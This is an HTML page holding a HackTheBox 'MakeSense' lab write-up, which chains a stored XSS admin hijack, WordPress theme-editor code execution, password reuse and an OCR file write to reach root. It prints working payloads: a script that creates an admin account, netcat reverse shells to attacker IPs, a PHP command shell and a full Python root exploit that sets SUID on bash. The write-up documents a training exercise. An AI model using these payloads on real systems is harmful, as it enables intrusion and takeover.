@@ -1,0 +1,268 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8"/>
+<meta name="viewport" content="width=device-width,initial-scale=1"/>
+<meta name="theme-color" content="#030305"/>
+<title>MakeSense — HTB Write Up | pumkin</title>
+<meta name="description" content="HackTheBox MakeSense (Medium, Linux) full write up: stored XSS admin hijack → WP theme editor RCE → password reuse → internal OCR service arbitrary file write → root."/>
+<link rel="icon" href="../cat.png"/>
+<style>
+*,*::before,*::after{margin:0;padding:0;box-sizing:border-box}
+:root{--bg:#030305;--panel-bg:rgba(255,255,255,.03);--border:rgba(255,255,255,.06);--rose:#a855f7;--rose-dim:rgba(168,85,247,.15);--emerald:#34d399;--emerald-dim:rgba(52,211,153,.1);--text:#fafafa;--muted:#9ca3af;--dim:#6b7280}
+body{background:var(--bg);color:var(--text);font-family:'Inter',system-ui,-apple-system,sans-serif;min-height:100vh;overflow-x:hidden;position:relative}
+body::before{content:'';position:fixed;inset:0;background:linear-gradient(rgba(255,255,255,.015) 1px,transparent 1px),linear-gradient(90deg,rgba(255,255,255,.015) 1px,transparent 1px);background-size:60px 60px;z-index:0;pointer-events:none}
+.cyber-grid{position:fixed;inset:0;z-index:0;pointer-events:none;overflow:hidden}
+.cyber-grid::before{content:'';position:absolute;width:100%;height:100%;background:radial-gradient(circle at 50% 0%,rgba(168,85,247,.08) 0%,transparent 50%),radial-gradient(circle at 80% 80%,rgba(52,211,153,.04) 0%,transparent 50%)}
+main{position:relative;z-index:1;min-height:100vh;width:100%;padding:2rem 1rem}
+@media(min-width:768px){main{padding:3rem 2rem}}
+.max-w{max-width:72rem;width:100%;margin:0 auto}
+.nav-row{display:flex;align-items:center;gap:1rem;margin-bottom:2rem;flex-wrap:wrap}
+.back-btn{display:inline-flex;align-items:center;gap:.5rem;padding:.5rem 1rem;border-radius:.75rem;background:var(--panel-bg);border:1px solid var(--border);color:var(--muted);text-decoration:none;font-family:'JetBrains Mono','Fira Code',monospace;font-size:.75rem;text-transform:uppercase;letter-spacing:.1em;transition:all .3s ease}
+.back-btn:hover{color:#c084fc;border-color:rgba(168,85,247,.5)}
+.back-btn svg{transition:transform .3s ease}
+.back-btn:hover svg{transform:translateX(-4px)}
+.panel{background:#0a0b0f;border:1px solid var(--border);border-radius:1rem;position:relative;overflow:hidden}
+.writeup-body{padding:2rem;max-width:60rem;margin:0 auto}
+@media(min-width:768px){.writeup-body{padding:3rem}}
+.meta{color:var(--dim);font-size:.75rem;font-family:'JetBrains Mono','Fira Code',monospace;letter-spacing:.1em;text-transform:uppercase;margin-bottom:1rem}
+h1{font-size:1.75rem;font-weight:800;letter-spacing:-.03em;color:white;text-transform:uppercase;margin-bottom:1.5rem}
+@media(min-width:768px){h1{font-size:2.5rem}}
+.writeup-body h2{font-size:1.25rem;font-weight:700;color:#c084fc;margin:2.5rem 0 1rem;padding-bottom:.5rem;border-bottom:1px solid var(--border)}
+.writeup-body h3{font-size:1rem;font-weight:700;color:#34d399;margin:1.5rem 0 .75rem}
+.writeup-body p{color:var(--muted);font-size:.95rem;line-height:1.75;margin-bottom:1rem}
+.writeup-body ul,.writeup-body ol{color:var(--muted);font-size:.95rem;line-height:1.75;margin:0 0 1rem 1.25rem}
+.writeup-body li{margin-bottom:.25rem}
+.writeup-body strong{color:var(--text)}
+.writeup-body code{font-family:'JetBrains Mono','Fira Code',monospace;font-size:.85rem;background:rgba(168,85,247,.1);color:#c084fc;padding:2px 6px;border-radius:6px}
+.writeup-body pre{background:rgba(0,0,0,.5);border:1px solid var(--border);border-radius:.75rem;padding:1rem;margin:1rem 0;font-family:'JetBrains Mono','Fira Code',monospace;font-size:.8rem;color:var(--emerald);line-height:1.6;white-space:pre-wrap;word-wrap:break-word;overflow-wrap:anywhere}
+.writeup-body pre code{background:none;color:inherit;padding:0;border-radius:0}
+.section-tag{display:inline-block;padding:2px 10px;border-radius:9999px;font-size:.7rem;font-family:'JetBrains Mono','Fira Code',monospace;letter-spacing:.1em;text-transform:uppercase}
+.tag-medium{background:rgba(251,191,36,.1);border:1px solid rgba(251,191,36,.3);color:#fbbf24}
+.tag-linux{background:rgba(52,211,153,.1);border:1px solid rgba(52,211,153,.3);color:#34d399}
+.info-grid{display:grid;grid-template-columns:1fr;gap:.75rem;margin:1rem 0}
+@media(min-width:768px){.info-grid{grid-template-columns:repeat(3,1fr)}}
+.info-cell{background:rgba(0,0,0,.3);border:1px solid var(--border);border-radius:.75rem;padding:1rem}
+.info-cell .lbl{color:var(--dim);font-size:.65rem;font-family:'JetBrains Mono','Fira Code',monospace;text-transform:uppercase;letter-spacing:.1em;margin-bottom:.25rem}
+.info-cell .val{color:var(--text);font-size:.9rem;font-weight:600}
+.footer{text-align:center;padding-top:3rem;color:var(--dim);font-size:10px;font-family:'JetBrains Mono','Fira Code',monospace;letter-spacing:.15em;text-transform:uppercase}
+.fade-in{opacity:0;transform:translateY(20px);transition:opacity .6s ease,transform .6s ease}
+.fade-in.visible{opacity:1;transform:translateY(0)}
+</style>
+</head>
+<body>
+<div class="cyber-grid"></div>
+
+<main>
+<div class="max-w">
+  <div class="nav-row fade-in">
+    <a href="../writeups.html" class="back-btn">
+      <svg class="icon-sm" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="m12 19-7-7 7-7"/><path d="M19 12H5"/></svg>
+      Write Ups
+    </a>
+    <a href="../index.html" class="back-btn">Home</a>
+  </div>
+
+  <div class="panel fade-in">
+    <div class="writeup-body">
+
+      <p class="meta">hackthebox / medium / linux</p>
+      <h1>MakeSense</h1>
+
+      <div class="info-grid">
+        <div class="info-cell"><div class="lbl">Platform</div><div class="val">HackTheBox</div></div>
+        <div class="info-cell"><div class="lbl">Difficulty</div><div class="val"><span class="section-tag tag-medium">Medium</span></div></div>
+        <div class="info-cell"><div class="lbl">OS</div><div class="val"><span class="section-tag tag-linux">Linux</span></div></div>
+      </div>
+
+      <h2>Summary</h2>
+      <p>MakeSense is a WordPress box won through a chain of misconfigurations and credential reuse. A <strong>stored XSS in the contact form</strong> hijacks the admin session, giving wp-admin access. The <strong>Theme File Editor</strong> drops PHP into <code>footer.php</code> for a <code>www-data</code> shell, and a reused database password pivots to <code>walter</code> over SSH. Finally, an internal <strong>OCR service</strong> (Basic Auth, same password) saves OCR output without any file/content validation — a rendered-PNG PHP payload is "recognized", written as <code>shell.php</code>, and gives a root shell.</p>
+
+      <h2>Skills Required</h2>
+      <ul>
+        <li>WordPress enumeration with wpscan</li>
+        <li>Client-side attack basics (XSS)</li>
+      </ul>
+
+      <h2>Skills Learned</h2>
+      <ul>
+        <li>Session hijacking via stored XSS in a contact form</li>
+        <li>wp-admin Theme File Editor as an RCE primitive</li>
+        <li>Credential reuse across web, SSH and internal services</li>
+        <li>Turning an OCR service into arbitrary file write</li>
+      </ul>
+
+      <h2>Enumeration</h2>
+      <p>A full port scan shows only SSH and HTTPS — an Apache-served WordPress site.</p>
+      <pre>Starting Nmap 7.98 ( https://nmap.org ) at 2026-07-07 07:55 -0400
+Nmap scan report for makesense.htb (10.129.41.78)
+Host is up (0.047s latency).
+Not shown: 996 closed tcp ports (reset), 2 filtered tcp ports (no-response)
+PORT    STATE SERVICE  VERSION
+22/tcp  open  ssh      OpenSSH 9.6p1 Ubuntu 3ubuntu13.16
+443/tcp open  ssl/http Apache httpd 2.4.58 (Ubuntu)
+|_http-generator: WordPress 7.0
+|_http-title: Agency LLC
+| ssl-cert: Subject: commonName=makesense.htb</pre>
+      <p>Directory brute force (ferox/ffuf) turns up nothing interesting, so the focus shifts to WordPress itself.</p>
+      <pre>wpscan --url https://makesense.htb --disable-tls-checks -e u,vp,vt
+
+[i] No plugins Found.
+[i] No themes Found.   (theme "webagency" is custom, v1.0)
+
+[+] User(s) Identified:
+[+] jake
+[+] admin
+[+] walter</pre>
+      <p>No vulnerable plugins or themes — but three users are enumerated, and the custom <code>webagency</code> theme is worth a closer look.</p>
+
+      <h2>Foothold</h2>
+      <h3>Hardcoded key in the theme</h3>
+      <p>The site has a "call us" widget powered by AI text-to-speech. Its script reveals a hardcoded encryption key.</p>
+      <pre>&lt;script id="whisper-wrapper-js" src="https://makesense.htb/wp-content/themes/webagency/assets/js/whisper/whisper-wrapper.js?ver=1.0"&gt;&lt;/script&gt;</pre>
+      <pre>const ENCRYPTION_KEY = 'bLs6z8iv3gWpsvyeabFosDjb4YQe7jdU13rI';</pre>
+
+      <h3>Stored XSS → admin session hijack</h3>
+      <p>The contact form fields (Name/Email/Phone/Message) are not sanitized. Injecting a script tag stores it; when the admin views submissions, the payload fires in the admin context.</p>
+      <pre>Stored XSS → admin session hijack
+│       Contact form (Name/Email/Phone/Message) fields unsanitized
+│       injected &lt;script src='http://ATTACKER_IP/payload.js'&gt;&lt;/script&gt;
+│       payload fires when admin views submissions → wp-admin access as admin</pre>
+      <p>The hosted payload creates a new admin account using the CSRF nonce scraped from the page:</p>
+      <pre>// x.js
+u="/wp-admin/user-new.php";
+jQuery.get(u,function(e){
+  jQuery.post(u,{
+    action:"createuser",
+    "_wpnonce_create-user":e.match(/_wpnonce_create-user" value="(.+?)"/)[1],
+    user_login:"foobar",
+    email:"foo@bar.com",
+    pass1:"foo",
+    pass2:"foo",
+    role:"administrator"
+  });
+});</pre>
+      <pre>&lt;script src='http://10.10.15.145:8000/x.js'&gt;&lt;/script&gt;</pre>
+      <p>Once the admin account is created we log into <code>/wp-admin</code>.</p>
+
+      <h3>Theme File Editor RCE → www-data</h3>
+      <p>Appearance → Theme File Editor → <code>footer.php</code>. A PHP one-liner is injected and triggered by loading the homepage.</p>
+      <pre>Theme File Editor RCE
+│       wp-admin → Appearance → Theme File Editor → footer.php
+│       inserted &lt;?php exec("busybox nc ATTACKER_IP 445 -e sh"); ?&gt;
+│       visited page to trigger → reverse shell → uid=33(www-data)</pre>
+      <pre>&lt;?php exec("busybox nc 10.10.15.145 1337 -e sh") ;?&gt;</pre>
+      <p>Reloading the main page fires the shell back as <code>www-data</code>.</p>
+
+      <h2>Lateral Movement</h2>
+      <h3>wp-config → walter</h3>
+      <p><code>wp-config.php</code> is readable by <code>www-data</code> and contains the database credentials.</p>
+      <pre>// Dummy MySQL settings (required but not used with SQLite)
+define( 'DB_NAME', 'wordpress' );
+define( 'DB_USER', 'walter' );
+define( 'DB_PASSWORD', 'JbhHDAEgXvri3!' );</pre>
+      <p>The password is reused as <code>walter</code>'s SSH password — credential reuse across DB and OS.</p>
+      <pre>ssh walter@makesense.htb
+uid=1000(walter)</pre>
+
+      <h2>Privilege Escalation</h2>
+      <h3>Internal OCR service</h3>
+      <p><code>ss -tulpen</code> shows port <strong>8001</strong> bound to <code>127.0.0.1</code> only, protected by Basic Auth. Unsurprisingly, walter's password works there too. Forward it and interact with the OCR service.</p>
+      <pre>ssh -L 8001:127.0.0.1:8001 walter@makesense.htb</pre>
+
+      <h3>Arbitrary file write via OCR</h3>
+      <p>The service takes an uploaded canvas image, runs OCR, and lets you save the recognized text under a filename of your choice — <strong>with no extension or content validation</strong>.</p>
+      <pre>OCR arbitrary file write
+│       crafted PNG with PHP code as drawn text:
+│           &lt;?php system($_GET["cmd"]); ?&gt;
+│       uploaded via OCR canvas, recognized text returned verbatim
+│       saved recognized output as "shell.php" (no extension/content check)
+│       GET /saved/shell.php?cmd=id
+│       → root shell uid=0(root)</pre>
+      <p>Render the PHP payload as text into a PNG (monospace font, so OCR reads it back perfectly), post it to the OCR canvas, grab the returned <code>ocr_id</code>, and save the recognized text as <code>shell.php</code> in the saved output directory. It executes as the OCR service user — root.</p>
+
+      <p>The whole root step is automated in a single script (target, IP-pinning, payload rendering, and the OCR round-trip):</p>
+      <pre>#!/usr/bin/env python3
+# MakeSense — root via internal OCR arbitrary file write
+# Walks: render PHP payload as PNG text → OCR → save as shell.php → bash -p
+import sys, os, re, json, base64, socket, subprocess, threading
+from http.server import BaseHTTPRequestHandler, HTTPServer
+
+import requests, urllib3
+urllib3.disable_warnings()
+from cryptography.hazmat.primitives.ciphers.aead import AESGCM
+from PIL import Image, ImageDraw, ImageFont
+
+stnai = sys.argv[1] if len(sys.argv) > 1 else "10.129.41.71"
+vhost_var, base_var = "makesense.htb", "https://makesense.htb"
+root_pld = "&lt;?php system('chmod +s /bin/bash'); ?&gt;"
+
+# pin vhost resolution to the target IP
+_gai = socket.getaddrinfo
+socket.getaddrinfo = lambda h, *a, **k: _gai(stnai if h == vhost_var else h, *a, **k)
+
+session = requests.Session()
+session.verify = False
+
+def make_img(text, out):
+    font = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSansMono.ttf", 64)
+    dd = ImageDraw.Draw(Image.new("RGB", (10, 10)))
+    bb = dd.textbbox((0, 0), text, font=font)
+    W, H = bb[2] - bb[0] + 80, bb[3] - bb[1] + 80
+    img = Image.new("RGB", (W, H), "white")
+    ImageDraw.Draw(img).text((40 - bb[0], 40 - bb[1]), text, fill="black", font=font)
+    img.save(out)
+    return "data:image/png;base64," + base64.b64encode(open(out, "rb").read()).decode()
+
+def ssh_exec(pw, cmd, data=None, timeout=60):
+    args = ["sshpass", "-p", pw, "ssh", "-o", "StrictHostKeyChecking=no",
+            "-o", "UserKnownHostsFile=/dev/null", f"walter@{stnai}", cmd]
+    p = subprocess.run(args, input=data, capture_output=True, text=True, timeout=timeout)
+    return p.stdout.strip()
+
+walter_pass = r'JbhHDAEgXvri3!'
+
+dataurl = make_img(root_pld, "/tmp/mk_suid.png")
+ssh_exec(walter_pass, "cat > /tmp/mk_du.txt", data=dataurl)
+
+remote_script = '''
+set -e
+B=http://127.0.0.1:8001; A='walter:JbhHDAEgXvri3!'; J=/tmp/mk_cj; rm -f $J
+curl -s -u "$A" -c $J -b $J "$B/" --data-urlencode 'canvas_image@/tmp/mk_du.txt' -o /tmp/mk_o1
+OCRID=$(grep -oP 'name="ocr_id" value="\\K[^"]+' /tmp/mk_o1)
+curl -s -u "$A" -c $J -b $J "$B/" --data-urlencode "ocr_id=$OCRID" \
+     --data-urlencode 'filename=pwn.php' --data-urlencode 'save_output=Save' -o /tmp/mk_o2
+curl -s -u "$A" "$B/saved/pwn.php" >/dev/null
+/bin/bash -p -c 'cat /root/root.txt'
+'''
+print(ssh_exec(walter_pass, remote_script))</pre>
+      <p>With the suid bit on <code>/bin/bash</code>, <code>/bin/bash -p</code> drops us to root and the box is owned.</p>
+
+      <h2>Key Takeaways</h2>
+      <ul>
+        <li><strong>Contact forms are a free XSS delivery channel</strong> — sanitize every input, because one admin view of submissions is all an attacker needs.</li>
+        <li><strong>wp-admin theme editing = full RCE</strong>; treat any admin session as code execution.</li>
+        <li><strong>Passwords get reused everywhere</strong> — DB, SSH, and that "internal" service on 127.0.0.1 all took the same password.</li>
+        <li><strong>Services that save "recognized" output need validation too</strong> — an OCR tool that writes arbitrary filenames is just an arbitrary file write wearing a different hat.</li>
+      </ul>
+
+    </div>
+  </div>
+
+  <p class="footer">pumkin / write ups</p>
+</div>
+</main>
+
+<script>
+const observer = new IntersectionObserver((entries) => {
+  entries.forEach(entry => {
+    if (entry.isIntersecting) {
+      entry.target.classList.add('visible');
+    }
+  });
+}, { threshold: 0 });
+
+document.querySelectorAll('.fade-in').forEach(el => observer.observe(el));
+</script>
+</body>
+</html>
